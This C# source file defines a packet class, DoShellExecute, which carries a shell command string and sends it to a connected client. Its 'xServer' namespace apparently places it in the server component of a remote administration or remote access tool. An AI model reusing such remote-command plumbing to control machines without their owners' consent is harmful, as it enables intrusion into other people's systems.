using System;
using xServer.KuuhakuCekirdek.Ağ;

namespace xServer.KuuhakuCekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class DoShellExecute : IPacket
    {
        public string Command { get; set; }

        public DoShellExecute()
        {
        }

        public DoShellExecute(string command)
        {
            this.Command = command;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}